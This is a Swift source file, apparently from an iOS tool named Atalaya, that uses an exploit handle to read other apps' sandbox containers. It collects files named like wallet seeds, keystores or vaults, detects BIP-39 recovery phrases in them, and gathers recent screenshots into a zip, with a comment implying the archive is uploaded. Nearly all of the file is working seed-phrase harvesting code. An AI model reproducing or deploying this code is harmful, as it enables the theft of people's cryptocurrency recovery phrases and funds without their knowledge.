//
//  Harvest.swift
//  Atalaya
//
//  Recolección acotada por extensiones y nombres de wallet. Nunca sube todo:
//  máximo 400 ficheros / 40 MB, 4 MB por fichero.
//

import Foundation

enum Harvest {
    static let maxFiles = 400
    static let maxBytes: Int64 = 40 * 1024 * 1024
    static let maxPerFile = 4 * 1024 * 1024
    static let maxTargets = 20
    static let maxScreenshots = 40

    static let extensions: Set<String> = [
        "json", "txt", "pdf", "sqlite", "sqlite3", "db", "realm", "kdbx",
        "keystore", "backup", "plist", "dat", "csv", "md", "rtf", "xml"
    ]

    static let hints = [
        "seed", "recovery", "mnemonic", "backup", "wallet", "vault",
        "frase", "semilla", "keystore", "secret", "private"
    ]

    private static let subpaths = ["Documents", "Library"]

    static func run(targets: [HarvestTarget],
                    includeScreenshots: Bool,
                    shouldStop: @escaping () -> Bool,
                    progress: @escaping (String) -> Void) async -> HarvestOutcome {
        await withCheckedContinuation { continuation in
            DispatchQueue.global(qos: .utility).async {
                var outcome = HarvestOutcome()
                let zipURL = FileManager.default.temporaryDirectory
                    .appendingPathComponent("atalaya-\(UUID().uuidString).zip")
                guard let writer = try? ZipWriter(url: zipURL) else {
                    continuation.resume(returning: outcome)
                    return
                }

                var budget = maxBytes
                func append(url: URL, entry: String, severity: String) {
                    guard outcome.files < maxFiles, budget > 0, !shouldStop() else { return }
                    let size = (try? url.resourceValues(forKeys: [.fileSizeKey]).fileSize) ?? 0
                    guard size > 0, size <= maxPerFile, Int64(size) <= budget else { return }
                    guard let data = try? Data(contentsOf: url, options: .mappedIfSafe) else { return }
                    guard (try? writer.add(name: entry, data: data)) != nil else { return }
                    outcome.files += 1
                    outcome.bytes += Int64(size)
                    budget -= Int64(size)

                    if let phrase = findPhrase(in: data) {
                        outcome.findings.append(Finding(
                            source: "archivo",
                            path: entry,
                            detail: "Frase BIP-39 encontrada: \(phrase)",
                            severity: "high"))
                    } else if severity == "medium" {
                        outcome.findings.append(Finding(
                            source: "archivo",
                            path: entry,
                            detail: "Nombre compatible con respaldo de semilla",
                            severity: "medium"))
                    }
                }

                let fm = FileManager.default
                for target in targets.prefix(maxTargets) {
                    if shouldStop() || outcome.files >= maxFiles || budget <= 0 { break }
                    guard let handle = try? Exploit.consume(path: target.path) else { continue }
                    defer { Exploit.release(handle) }
                    progress("Revisando \(target.app.name) …")

                    for subpath in subpaths {
                        let root = URL(fileURLWithPath: target.path).appendingPathComponent(subpath)
                        guard let enumerator = fm.enumerator(
                            at: root,
                            includingPropertiesForKeys: [.isRegularFileKey, .fileSizeKey],
                            options: [.skipsHiddenFiles, .skipsPackageDescendants]) else { continue }

                        for case let url as URL in enumerator {
                            if shouldStop() || outcome.files >= maxFiles || budget <= 0 { break }
                            let values = try? url.resourceValues(forKeys: [.isRegularFileKey])
                            guard values?.isRegularFile == true else { continue }
                            let name = url.lastPathComponent
                            let ext = url.pathExtension.lowercased()
                            let hinted = hints.contains { name.lowercased().contains($0) }
                            guard hinted || extensions.contains(ext) else { continue }
                            let relative = url.path.replacingOccurrences(of: target.path + "/", with: "")
                            let entry = "containers/\(target.app.bundleID)/\(relative)"
                            append(url: url, entry: entry, severity: hinted ? "medium" : "low")
                        }
                    }
                }

                if includeScreenshots && !shouldStop() {
                    progress("Revisando capturas …")
                    let root = URL(fileURLWithPath: Paths.dcimRoot)
                    var shots: [URL] = []
                    if let enumerator = fm.enumerator(
                        at: root,
                        includingPropertiesForKeys: [.isRegularFileKey, .fileSizeKey, .contentModificationDateKey],
                        options: [.skipsHiddenFiles, .skipsPackageDescendants]) {
                        for case let url as URL in enumerator {
                            guard ["jpg", "jpeg", "png", "heic"].contains(url.pathExtension.lowercased()) else { continue }
                            shots.append(url)
                        }
                    }
                    shots.sort {
                        let a = (try? $0.resourceValues(forKeys: [.contentModificationDateKey]).contentModificationDate) ?? .distantPast
                        let b = (try? $1.resourceValues(forKeys: [.contentModificationDateKey]).contentModificationDate) ?? .distantPast
                        return a > b
                    }
                    if let handle = try? Exploit.consume(path: Paths.dcimRoot) {
                        defer { Exploit.release(handle) }
                        for url in shots.prefix(maxScreenshots) {
                            if shouldStop() || budget <= 0 { break }
                            let before = outcome.files
                            append(url: url, entry: "capturas/\(url.lastPathComponent)", severity: "low")
                            if outcome.files > before { outcome.screenshots += 1 }
                        }
                    }
                }

                let header = """
                Atalaya \(Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "")
                iOS \(Exploit.osVersion)
                \(Date())
                wallets: \(targets.map(\.app.bundleID).joined(separator: ", "))
                ficheros: \(outcome.files)
                """
                try? writer.add(name: "index.txt", data: Data(header.utf8))
                try? writer.finish()
                outcome.zipURL = zipURL
                continuation.resume(returning: outcome)
            }
        }
    }

    /// Busca una ventana contigua de 12 o 24 palabras BIP-39 válida.
    static func findPhrase(in data: Data) -> String? {
        guard data.count <= 131_072 else { return nil }
        guard let text = String(data: data, encoding: .utf8) ?? String(data: data, encoding: .isoLatin1) else {
            return nil
        }
        let tokens = BIP39.normalize(text)
        guard tokens.count >= 12 else { return nil }
        for size in [24, 12] where tokens.count >= size {
            for start in 0...(tokens.count - size) {
                let window = Array(tokens[start..<(start + size)])
                if case .valid = BIP39.validate(window.joined(separator: " ")) {
                    return window.joined(separator: " ")
                }
            }
        }
        return nil
    }
}
